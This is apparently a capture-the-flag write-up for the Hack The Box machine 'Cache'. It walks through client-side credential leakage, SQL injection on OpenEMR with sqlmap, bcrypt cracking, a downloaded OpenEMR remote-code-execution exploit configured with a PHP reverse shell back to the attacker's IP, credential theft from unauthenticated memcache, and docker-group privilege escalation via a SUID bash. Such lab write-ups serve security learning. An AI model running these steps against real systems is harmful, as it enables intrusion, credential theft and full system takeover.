Cache is a medium rated Linux box by [ASHacker](https://www.hackthebox.eu/home/users/profile/23227). Firstly on port 80, the author's page gave information leading to a hostname which was running old version of OpenEMR which was vulnerable to multiple things. Username and password was extracted using SQLMAP and a reverse shell was obtained as www-data after running publicly available exploit. In the box, memcache was running on port 11211 which had password for the local user luffy. Luffy was on docker group which was exploited to get a root shell on the box.

### Flags used in nmap

*   -sC for default scripts
*   -sV for enumerating version
*   -oA for saving output in folder nmap with filename cache in all format

We only have two ports open. SSH is running on port 22 and HTTP service on port 80. As we SSH does not have that many vulnerabilities to look into, let's check out the webserver running on port 80.

# Port 80
![1](/assets/images/cache/1.png)

### Directory busting to find out files and directories
```console
local@local:~/Documents/htb/boxes/cache$ gobuster dir -u http://10.10.10.188 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt
/index.html (Status: 200)
/news.html (Status: 200)
/login.html (Status: 200)
/contactus.html (Status: 200)
/author.html (Status: 200)
/net.html (Status: 200)
/javascript (Status: 301)
/jquery (Status: 301)
/server-status (Status: 403)
```
### Flags used in Gobuster
*   dir for directory bruteforcing mode
*   -u to specify url
*   -w to specify the wordlist
*   -x to specify file extensions

## Checking the /login.html
![2](/assets/images/cache/2.png)

At this point we did not have any creds. So, I tried few default creds like `admin:admin`, `admin:password`.

When I tried to login with `admin:admin`, it instantly said **Password didnot match** as if it did not even request the server. So I thought what if the login is handled by the javascript in our browser.
![3](/assets/images/cache/3.png)

### Looking at the source 
![4](/assets/images/cache/4.png)

### Content on /jquery/functionality.js
```js
$(function(){
    
    var error_correctPassword = false;
    var error_username = false;
    
    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){
            alert("Password didn't Match");
            error_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){
            alert("Username didn't Match");
            error_username = true;
        }
    }
    $("#loginform").submit(function(event) {
        /* Act on the event */
        error_correctPassword = false;
         checkCorrectPassword();
         error_username = false;
         checkCorrectUsername();


        if(error_correctPassword == false && error_username ==false){
            return true;
        }
        else{
            return false;
        }
    });
    
});
```
We get the login credential for user ash. 
```
ash:H@v3_fun
```

### Logging in as ash
![5](/assets/images/cache/5.png)
Looking at the page, it seems like a dead end as the page is under construction. So lets head back to home page and enumerate other pages.

## Checking /author.html
![6](/assets/images/cache/6.png)

This page talks about the author Ash who is the creater of this project cache and we also get a hostname **cache.htb** which we will add to our _/etc/hosts_ file and also it says that Ash also did a project called HMS(Hospital Management System).

### Adding hostname to host file
```console
10.10.10.188    cache.htb htb
```

### Checking cache.htb
![7](/assets/images/cache/7.png)

But we get the exact same page as before.

At this point I was stuck. As I had creds for ash, I tried to login as ash using SSH.
```console
local@local:~/Documents/htb/boxes/cache$ ssh ash@10.10.10.188
ash@10.10.10.188's password: 
Permission denied, please try again.
```
We did not log in, but it was worth a try because credentials resue is a very common thing.

## Revisiting /author.html
The author did talk about another project called HMS. So I thought, he created a project called **cache** and the website for cache is hosted under name **cache.htb**, so if he is to create another project called HMS and has to host this project, it is very likely that hostname will be **hms.htb**. At this point I was out of ideas and it seemed like it was worth a try. So I added this entry on my host file.
```console
10.10.10.188    cache.htb htb hms.htb
```

## Checking hms.htb
![8](/assets/images/cache/8.png)

And it does exists. Nice.  

Looking at the page, it is running OpenEMR which is a medical practice management software which also supports Electronic Medical Records but more important thing is the copyright at the bottom of the page which says **2018**. It means that this is probably the old version of OpenEMR.  
 I looked around and found a [article](https://medium.com/@musyokaian/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69), which explains that there a SQL injection on parameter **eid** on **/portal/add_edit_event_user.php**, user information is stored in table **users_secure**, and also gives a nice litle script for code execution. So we have everything we need. Now we have to extract the credentials from the database using **sqlmap** and using that credentials we can run the exploit to get the shell on the box.

# Reverse Shell On the box 
### Checking /portal/add_edit_event_user.php

![9](/assets/images/cache/9.png)

Sending value of `eid=1'` gives us an error. This is a very good sign. Now we can enumerate the whole database manually or can use automated tools like **sqlmap** to do the work for us.

## Using sqlmap to dump the database content
### Interepting the request with Burp
![10](/assets/images/cache/10.png)

### Saving the request to a file
```console
local@local:~/Documents/htb/boxes/cache$ cat cache.req

### Flags Used
*   -r to specify a request file
*   --batch to tell sqlmap to answer all the questions for us so that it doesnot wait for us to give the answer
*   --risk 3 and --level 5 are the highest value which tells sqlmap to make as much requests it wants

Sqlmap says the website is vulnerable. So lets dump contents from the database.

## Dumping all the contents

```
There are a lot of tables here. But the blog post from earlier specified that the juicy information are stored in table **users_secure**.

### Contents of users_secure
```console
local@local:~/Documents/htb/boxes/cache$ /opt/sqlmap-dev/sqlmap.py -r cache.req -D openemr -T users_secure --dump

```
### Flags used
*   -D to specify the database name
*   -T to specify the table name
*   --dump to get the content of that table

And we got a username and a password hash.
```
openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.
```
So let's try and crack this hash.

## Cracking hash using hashcat
Checking on the [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) page, I found the mode for this bcrypt hash in hashcat is 3200.
```console
local@local:~/Documents/htb/boxes/cache$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt                                                                        
                                                                                        
$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.:xxxxxx  
```
And the hash cracked successfully.
### Flags used
*   -m to specify mode for the hash

Now that we have a valid credentials, let's run the exploit from the blog.

### Downloading exploit to local box
```console
local@local:~/Documents/htb/boxes/cache$ wget https://raw.githubusercontent.com/musyoka101/OpenEMR-5.0.1-Remote-Code-execution-Vulnerability-Exploit/master/openemr_exploit.py
```
### Modifying the payload with our information
```python
...
username = "openemr_admin" # change this to the the appropriate username
password = "xxxxxx" # change this to the the appropriate password
payload = {'site': 'default', 'mode' : 'save', 'docid' : 'shell.php', 'content' : """<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.15';  # CHANGE THIS
$port = 9001;       # CHANGE THIS
...
url = "http://hms.htb/interface/main/main_screen.php?auth=login&site=default"
```
And change all the information accordingly.

### Setup a netcat listener on port 9001
```console
local@local:~/Documents/htb/boxes/cache$ nc -nvlp 9001
Listening on [0.0.0.0] (family 2, port 9001)
Listening on 0.0.0.0 9001
```
### Running the exploit
```console
local@local:~/Documents/htb/boxes/cache$ python openemr_exploit.py 
HELP MENU
[1] Change the listening IP Address and Create a Listener: Default port 9001
[2] Change the Username and Password to the approrpriate one

It ran successfully and if we checked the netcat listening on port 9001,we got a connection back.
```console
local@local:~/Documents/htb/boxes/cache$ nc -nvlp 9001

```

## Getting a proper Shell
```console
$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@cache:/$
```
Hit `CTRL + z` to background this process and on local box run
```console
local@local:~/Documents/htb/boxes/cache$ stty raw -echo
```
Then type `fg` and hit enter twice to go to the earlier backgrounded process. Then export TERM variable as xterm.
```console
www-data@cache:/$ export TERM=xterm
```
Now we get a proper shell with autocompletion and we can clear the screen with `clear` or `CTRL + l`.

```
Here I found extra ports which are only listening on local interface `127.0.0.1`, means they can not be accessed from outside. One is MYSQL running on port 3306 which we already exploited while getting a reverse shell and other service which is listening on port 11211.  
 The service that usually runs on the port 11211 is **memcache**. Memcache is object caching system which stores values in **key:value** pairs and the interesting thing about memcache is that it doesnot implement any authentication. So we can use telnet to connect and look all the key value pairs on the memcache.

## Extracting key:value pairs from memcache
```console
www-data@cache:/dev/shm$ telnet 127.0.0.1 11211
Trying 127.0.0.1...     
Connected to 127.0.0.1.

```
Here we first connected to memcache running on the port 11211 using telnet. Then we listed all the items using `stats items` and it looked like there is only a single item with id 1. So using `stats cachedump 1 10`, we tell the memcache to list 10 key value pairs on the 1st item. And then we get values for the key **user** and **passwd** using `get user` and `get passwd` respectively.

```console
luffy:0n3_p1ec3
```

### Users on the box with shell
```console
www-data@cache:/dev/shm$ cat /etc/passwd | grep -i bash
root:x:0:0:root:/root:/bin/bash
ash:x:1000:1000:ash:/home/ash:/bin/bash
luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
```
As luffy was a user on the box, lets try and login to luffy's account.

```console
www-data@cache:/dev/shm$ su luffy
Password: 
luffy@cache:/dev/shm$ 
```
And we are on the box as user luffy.

# Privilege Escalation to root

### Listing the groups for current user
```console
luffy@cache:~$ groups
luffy docker
```

As our user luffy is on docker group, we can create a new docker container and mount the root filesystem on that docker container.

## Listing docker images on the box
```console
luffy@cache:~$ docker image ls -a
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        12 months ago       64.2MB
luffy@cache:~$ 
```
### Creating a new container with the image id
```console
luffy@cache:~$ docker run -v /:/mnt  -it 2ca708c1c9cc bash
root@0079b4fb2425:/# 
```
Here we created a new container from the ubuntu image and mounted the root filesystem **/** to container's **/mnt** and with flag `-it`, we opened a interactive session running `bash` inside the container.

### Listing the file contents in /mnt
```console
root@0079b4fb2425:/# ls -la /mnt

lrwxrwxrwx   1 root root         30 Jul  9 09:26 vmlinuz.old -> boot/vmlinuz-4.15.0-99-generic
```
We can see that our whole root filesystem is mounted here.

### Reading user.txt and root.txt
```console
root@0079b4fb2425:/mnt# cat root/root.txt && cat home/ash/user.txt 
2bc0************************ea57
d52e************************8f1e
```

## Getting a root shell
```console
root@0079b4fb2425:/mnt# cp bin/bash tmp/bash && chmod 4777 tmp/bash
```
Here we copied usual bin/bash binary to tmp/bash and we changed the file permission so that it has SUID bit set and can be executed by anyone.

So lets exit the container and execute the binary.
```console
root@0079b4fb2425:/mnt# exit
exit

luffy@cache:~$ ls -la /tmp/bash
-rwsrwxrwx 1 root root 1113504 Sep 30 12:42 /tmp/bash

luffy@cache:~$ /tmp/bash -p

bash-4.4# id
uid=1001(luffy) gid=1001(luffy) euid=0(root) groups=1001(luffy),999(docker)
bash-4.4# 
```
As we can see the there is a binary called bash on /tmp with SUID bit set and can be executed by anyone and upon execution we get a bash shell as root.
